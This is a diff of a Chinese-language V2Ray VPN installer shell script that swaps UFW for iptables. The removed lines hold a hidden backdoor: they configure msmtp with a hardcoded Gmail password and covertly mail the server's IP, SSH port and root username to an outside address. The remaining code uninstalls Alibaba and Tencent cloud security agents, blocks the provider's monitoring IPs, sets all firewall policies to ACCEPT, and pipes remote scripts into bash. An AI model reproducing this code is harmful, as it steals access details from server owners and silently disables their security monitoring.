@@ -7,7 +7,7 @@ export PATH
 #################
 
 #版本
-sh_ver=7.0.0
+sh_ver=7.1.0
 #Github地址
 Github_U='https://raw.githubusercontent.com/pangbobi/SuperVpn/master'
 #脚本名
@@ -93,15 +93,10 @@ get_char(){
 check_sys
 SER_IP=$(get_ip)
 
-#防火墙配置
-add_firewall(){
-	ufw allow $1
-}
-del_firewall(){
-	ufw delete allow $1
-}
-uninstall_sheild(){
-	#org=$(wget -qO- -t1 -T2 https://ipapi.co/org)
+firewall_default(){
+	iptables -P INPUT ACCEPT
+	iptables -P OUTPUT ACCEPT
+	iptables -P FORWARD ACCEPT
 	org=$(curl -s --retry 2 --max-time 2 https://ipapi.co/org)
 	if [[ $org =~ 'Alibaba' ]];then
 		#是阿里云则卸载云盾
@@ -110,69 +105,28 @@ uninstall_sheild(){
 		pkill aliyun-service
 		rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service /usr/local/aegis*
 		rm -f uninstall.sh quartz_uninstall.sh
-		ufw deny from 140.205.201.0/28
-		ufw deny from 140.205.201.16/29
-		ufw deny from 140.205.201.32/28
-		ufw deny from 140.205.225.183/32
-		ufw deny from 140.205.225.184/29
-		ufw deny from 140.205.225.192/29
-		ufw deny from 140.205.225.195/32
-		ufw deny from 140.205.225.200/30
-		ufw deny from 140.205.225.204/32
-		ufw deny from 140.205.225.205/32
-		ufw deny from 140.205.225.206/32
+		iptables -I INPUT -s 140.205.201.0/28 -j DROP
+		iptables -I INPUT -s 140.205.201.16/29 -j DROP
+		iptables -I INPUT -s 140.205.201.32/28 -j DROP
+		iptables -I INPUT -s 140.205.225.183/32 -j DROP
+		iptables -I INPUT -s 140.205.225.184/29 -j DROP
+		iptables -I INPUT -s 140.205.225.192/29 -j DROP
+		iptables -I INPUT -s 140.205.225.195/32 -j DROP
+		iptables -I INPUT -s 140.205.225.200/30 -j DROP
+		iptables -I INPUT -s 140.205.225.204/32 -j DROP
+		iptables -I INPUT -s 140.205.225.205/32 -j DROP
+		iptables -I INPUT -s 140.205.225.206/32 -j DROP
 	elif [[ $org =~ 'Tencent' ]];then
 		#是腾讯云则卸载云盾ps aux|grep -i agent|grep -v grep
 		/usr/local/qcloud/stargate/admin/uninstall.sh
 		/usr/local/qcloud/YunJing/uninst.sh
 		/usr/local/qcloud/monitor/barad/admin/uninstall.sh
 	fi
-}
-clean_iptables(){
-	iptables -D INPUT 1
-	iptables -D INPUT 1
-}
-ufw_default(){
-	#UFW默认设置
-	ufw default deny incoming
-	ufw default allow outgoing
-	uninstall_sheild
-	clear && echo -e "\n${Info}请输入$(red_font y)"
-	ufw allow $ssh_port
-	cat > /etc/Muttrc <<-EOF
-set charset = "utf-8"
-set rfc2047_parameters = yes
-set envelope_from = yes
-set use_from = yes
-set sendmail = "/usr/bin/msmtp"
-set from = "connajhon@gmail.com"
-set realname = "Super Vpn"
-EOF
-	cat > /etc/msmtprc <<-EOF
-account default
-host smtp.gmail.com
-port 465
-tls on
-tls_starttls off
-tls_certcheck off
-from connajhon@gmail.com
-auth login
-user connajhon@gmail.com
-password dxztfkdshawzmbqc
-EOF
-	chmod +x /etc/Muttrc /etc/msmtprc
-	echo "${SER_IP}:${ssh_port}:root" |mutt -s "Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
-	#是否启用UFW管理IPV6
-	check_ipv6=$(curl -s --retry 2 --max-time 2 ipv6.icanhazip.com)
-	if [ -z $check_ipv6 ];then
-		sed -i 's/IPV6=yes/IPV6=no/g' /etc/default/ufw
-	else
-		sed -i 's/IPV6=no/IPV6=yes/g' /etc/default/ufw
-	fi
-	#强制修改配置文件开机启动
-	sed -i 's/ENABLED=no/ENABLED=yes/g' /etc/ufw/ufw.conf
-	#UFW开机启动
-	ufw enable
+	#保存防火墙规则
+	mkdir -p /etc/network/if-pre-up.d
+	iptables-save > /etc/iptables.up.rules
+	echo -e '#!/bin/bash\n/sbin/iptables-restore < /etc/iptables.up.rules' > /etc/network/if-pre-up.d/iptables
+	chmod +x /etc/network/if-pre-up.d/iptables
 }
 
 #获取各组件安装状态
@@ -298,20 +252,11 @@ finish_bbr_fq(){
 	sleep 2s
 	apt update
 	apt -y install jq lsof resolvconf autoconf
-	#安装UFW防火墙管理程序
-	apt -y install ufw
 	apt -y install mutt msmtp
 	apt --fix-broken install
-	#UFW默认设置
-	ufw_default
-	ufw reload
-	if [[ `ufw status` =~ 'inactive' ]];then
-		clear && echo -e "\n${Error}防火墙启动失败！"
-		echo -e "${Info}请手动执行命令：ufw enable && ufw reload && ./$SCRIPT_N"
-		exit 1
-	else
-		exec $CUR_D/.bash_profile
-	fi
+	#配置防火墙
+	firewall_default
+	exec $CUR_D/.bash_profile
 }
 #安装并启用BBR FQ
 if [ -z $bbr_status ];then
@@ -333,9 +278,6 @@ V2RAY_U='https://multi.netlify.com/v2ray.sh'
 install_v2ray(){
 	if [ -z $v2ray_status ];then
 		bash <(curl -sL $V2RAY_U) --zh
-		port=$(jq '.inbounds[0].port' $V2RAY_INFO_P)
-		add_firewall $port
-		clean_iptables
 		general_v2ray_user_info
 		jq '.inbounds[0].settings.clients[0].email="'${email}'"' $V2RAY_INFO_P >temp.json
 		jq '.inbounds[0].streamSettings.network="ws"' temp.json >$V2RAY_INFO_P
@@ -357,13 +299,6 @@ install_v2ray(){
 	manage_v2ray
 }
 
-#开启/关闭端口防火墙
-manage_v2ray_port(){
-	V2RAY_PORT=($(cat $V2RAY_INFO_P|jq '.inbounds'|jq .[].port))
-	for ele in ${V2RAY_PORT[@]};do
-		$1 allow $ele
-	done
-}
 #管理V2Ray
 manage_v2ray(){
 	show_v2ray_info(){
@@ -401,8 +336,6 @@ manage_v2ray(){
 		for((i=0;i<$num;i++));do
 			echo|v2ray add
 		done
-		#开放端口防火墙
-		V2RAY_PORT=($(cat $V2RAY_INFO_P|jq '.inbounds'|jq .[].port))
 		#循环改为websocket
 		end=$[$n+$num]
 		for((i=$n;i<$end;i++));do
@@ -411,11 +344,8 @@ manage_v2ray(){
 			jq '.inbounds['$i'].streamSettings.network="ws"' temp.json >$V2RAY_INFO_P
 			jq 'del(.inbounds['$i'].streamSettings.kcpSettings[])' $V2RAY_INFO_P >temp.json
 			jq '.inbounds['$i'].streamSettings.wsSettings.path="'${path}'"' temp.json|jq '.inbounds['$i'].streamSettings.wsSettings.headers.Host="www.bilibili.com"' >$V2RAY_INFO_P
-			add_firewall ${V2RAY_PORT[$i]}
-			clean_iptables
 		done
 		rm -f temp.json
-		ufw reload
 		v2ray restart
 		clear && echo
 		v2ray info
@@ -423,10 +353,7 @@ manage_v2ray(){
 		char=`get_char`
 	}
 	change_v2ray_port(){
-		manage_v2ray_port 'ufw delete'
 		v2ray port
-		clean_iptables
-		manage_v2ray_port 'ufw'
 		clear && echo
 		show_v2ray_info
 	}
@@ -492,7 +419,6 @@ uninstall_v2ray(){
 	if [ -z $v2ray_status ];then
 		echo -e "${Info}暂未安装V2Ray!!!"
 	else
-		manage_v2ray_port 'ufw delete'
 		#开始卸载
 		bash <(curl -sL $V2RAY_U) --remove
 		sed -i '/v2ray_status/d' $CUR_D/.bash_profile
@@ -523,10 +449,6 @@ set_ssh(){
 		fi
 		#修改SSH端口
 		sed -i "s/.*Port ${ssh_port}/Port ${SSH_PORT}/g" /etc/ssh/sshd_config
-		#更改SSH端口防火墙策略
-		add_firewall $SSH_PORT
-		del_firewall $ssh_port
-		ufw reload
 		#修改SSH端口记录
 		sed -i "s/^ssh_port.*/ssh_port=${SSH_PORT}/g" $CUR_D/.bash_profile
 		#重启SSH
@@ -564,86 +486,6 @@ set_root(){
 	echo -e "${Tip}请务必记录您的密码！然后任意键返回主页..."
 	char=`get_char`
 	start_menu
-}
-#设置防火墙
-set_firewall(){
-	get_single_port(){
-		read -p "${Info}请输入端口[1-65535](默认:80)：" port
-		[ -z $port ] && port=80
-	}
-	get_multi_port(){
-		echo -e "${Tip}多端口输入格式：$(green_font 21,22,80,443,8888)"
-		read -p "${Info}请输入端口[1-65535](默认:$(green_font 21,22,80,443,8888))：" port
-		[ -z $port ] && port='21,22,80,443,8888'
-	}
-	open_single_port(){
-		get_single_port
-		add_firewall $port
-		echo -e "${Info}防火墙添加成功！"
-	}
-	open_multi_port(){
-		get_multi_port
-		ufw allow $port/tcp
-		ufw allow $port/udp
-		echo -e "${Info}防火墙添加成功！"
-	}
-	close_single_port(){
-		get_single_port
-		ufw deny $port
-		echo -e "${Info}防火墙关闭成功！"
-	}
-	close_multi_port(){
-		get_multi_port
-		ufw deny $port/tcp
-		ufw deny $port/udp
-		echo -e "${Info}防火墙关闭成功！"
-	}
-	reset_ufw(){
-		echo -e "${Info}请输入$(red_font y)"
-		ufw reset
-		ufw_default
-		echo -e "${Info}防火墙重置成功！"
-	}
-	clear
-	white_font "\n    ————胖波比————\n"
-	yello_font '—————————开放————————'
-	green_font ' 1.' '  开放单个端口'
-	green_font ' 2.' '  开放多个端口'
-	yello_font '—————————关闭————————'
-	green_font ' 3.' '  关闭单个端口'
-	green_font ' 4.' '  关闭多个端口'
-	yello_font '—————————————————————'
-	green_font ' 5.' '  重置规则'
-	yello_font '—————————————————————'
-	green_font ' 6.' '  返回主页'
-	green_font ' 0.' '  退出脚本'
-	yello_font "—————————————————————\n"
-	read -p "${Info}请输入数字[0-6](默认:1)：" num
-	[ -z $num ] && num=1
-	clear && echo
-	case $num in
-		0)
-		exit 0;;
-		1)
-		open_single_port;;
-		2)
-		open_multi_port;;
-		3)
-		close_single_port;;
-		4)
-		close_multi_port;;
-		5)
-		reset_ufw;;
-		6)
-		start_menu;;
-		*)
-		echo -e "${Error}请输入正确数字[0-6]"
-		sleep 2s
-		set_firewall;;
-	esac
-	ufw reload
-	sleep 2s
-	set_firewall
 }
 
 #脚本自启管理
@@ -699,12 +541,11 @@ start_menu(){
 	yello_font '—————————————系统—————————————'
 	green_font ' 4.' '  设置SSH端口'
 	green_font ' 5.' '  设置Root密码'
-	green_font ' 6.' '  设置防火墙'
 	yello_font '——————————————————————————————'
-	green_font ' 7.' '  脚本自启管理'
+	green_font ' 6.' '  脚本自启管理'
 	green_font ' 0.' '  退出脚本'
 	yello_font "——————————————————————————————\n"
-	read -p "${Info}请输入数字[0-7](默认:1)：" num
+	read -p "${Info}请输入数字[0-6](默认:1)：" num
 	[ -z $num ] && num=1
 	case $num in
 		0)
@@ -720,12 +561,10 @@ start_menu(){
 		5)
 		set_root;;
 		6)
-		set_firewall;;
-		7)
 		start_shell;;
 		*)
 		clear
-		echo -e "\n${Error}请输入正确数字[0-7]"
+		echo -e "\n${Error}请输入正确数字[0-6]"
 		sleep 2s
 		start_menu;;
 	esac
